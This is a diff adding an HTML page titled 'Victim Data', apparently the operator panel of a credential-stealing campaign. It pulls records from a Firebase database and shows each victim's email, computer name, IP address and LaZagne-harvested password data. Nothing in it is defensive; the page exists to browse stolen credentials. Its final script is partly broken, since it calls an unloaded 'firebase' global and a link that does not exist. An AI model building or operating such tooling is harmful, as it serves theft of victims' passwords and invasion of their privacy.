@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Victim Data</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+  />
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+    import { getDatabase, ref, onValue, get } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY_HERE",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID",
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    function escapeHtml(text) {
+      if (!text) return "";
+      return text
+        .toString()
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const params = new URLSearchParams(window.location.search);
+      const id = params.get("id");
+
+      const loading = document.getElementById("loading");
+      const error = document.getElementById("error");
+      const title = document.getElementById("title");
+      const content = document.getElementById("content");
+
+      loading.classList.remove("hidden");
+      error.classList.add("hidden");
+
+      if (id === null) {
+        loading.classList.add("hidden");
+        error.textContent = "No victim ID provided.";
+        error.classList.remove("hidden");
+        return;
+      }
+
+      const historyRef = ref(db, "history/season2025");
+
+      get(historyRef)
+        .then((snapshot) => {
+          const historyData = snapshot.val();
+          if (!historyData) throw new Error("No victims found.");
+
+          const emails = Object.keys(historyData);
+          const index = parseInt(id, 10);
+
+          if (isNaN(index) || index < 0 || index >= emails.length) {
+            throw new Error("Invalid victim ID.");
+          }
+
+          const victimEmailKey = emails[index];
+          const victimEmail = victimEmailKey.replace(/_/g, ".").replace(/,/g, ".");
+
+          title.textContent = `Data for: ${victimEmail}`;
+
+          return get(ref(db, "credentials")).then((credSnap) => {
+            const credentialsData = credSnap.val();
+            if (!credentialsData) throw new Error("No credentials found.");
+
+            const matches = [];
+            for (const [computer, data] of Object.entries(credentialsData)) {
+              if (!data.email) continue;
+
+              const storedEmailNormalized = data.email.toLowerCase().replace(/,/g, ".");
+              const victimEmailNormalized = victimEmail.toLowerCase();
+
+              if (storedEmailNormalized === victimEmailNormalized) {
+                matches.push({ computer, data });
+              }
+            }
+
+            if (matches.length === 0) {
+              content.innerHTML = `<p class="text-gray-700">No credential data found for this email.</p>`;
+              return;
+            }
+
+            let html = `<div class="space-y-6">`;
+
+            matches.forEach(({ computer, data }) => {
+              html += `
+                <div class="bg-white p-6 rounded shadow">
+                  <h2 class="text-lg font-semibold mb-2">Computer: ${escapeHtml(computer)}</h2>
+                  <p><strong>IP:</strong> ${escapeHtml(data.ip || "N/A")}</p>
+                  <p><strong>Timestamp:</strong> ${escapeHtml(data.timestamp || "N/A")}</p>
+                  <h3 class="mt-4 mb-2 font-semibold">LaZagne Data:</h3>
+                  <pre class="whitespace-pre-wrap max-h-60 overflow-y-auto bg-gray-100 p-3 rounded border border-gray-300 text-sm">${escapeHtml(JSON.stringify(data.data, null, 2) || "No data")}</pre>  
+                </div>
+              `;
+            });
+
+            html += "</div>";
+
+            content.innerHTML = html;
+          });
+        })
+        .catch((err) => {
+          loading.classList.add("hidden");
+          error.textContent = `Error: ${err.message}`;
+          error.classList.remove("hidden");
+        })
+        .finally(() => {
+          loading.classList.add("hidden");
+        });
+    });
+  </script>
+</head>
+<body class="h-screen flex font-sans bg-gray-100">
+  <aside class="w-64 bg-[#1C1C1C] text-white flex flex-col py-8 px-4 h-full">
+    <h2 class="text-xl font-bold mb-10 px-2">Dashboard</h2>
+    <nav class="space-y-6">
+      <a href="index.html" class="flex items-center space-x-3 px-2 text-white"><i class="fas fa-tachometer-alt"></i><span>Dashboard</span></a>
+      <a href="victim.html" class="flex items-center space-x-3 px-2 text-white font-bold"><i class="fas fa-user-friends"></i><span>Victim</span></a>
+      <a href="login.html" class="flex items-center space-x-3 px-2 text-white"><i class="fas fa-sign-out-alt"></i><span>Logout</span></a>
+    </nav>
+  </aside>
+
+  <main class="flex-1 p-6 overflow-y-auto bg-[#F5F8F7]">
+    <h1 id="title" class="text-3xl font-bold text-gray-800 mb-6">Loading victim data...</h1>
+    <div id="loading" class="text-center text-gray-600 mb-6">Loading data, please wait...</div>
+    <div id="error" class="text-center text-red-500 hidden mb-6"></div>
+    <div id="content" class="max-w-4xl mx-auto"></div>
+  </main>
+  <script>
+  firebase.initializeApp(firebaseConfig);
+
+  firebase.auth().onAuthStateChanged((user) => {
+    if (!user) {
+      window.location.href = '/admin/login.html';
+    }
+  });
+
+  document.querySelector('a[href="/admin/login.html"]').addEventListener('click', (e) => {
+    e.preventDefault();
+    firebase.auth().signOut().then(() => {
+      window.location.href = '/admin/login.html';
+    });
+  });
+</script>
+</body>
+</html>
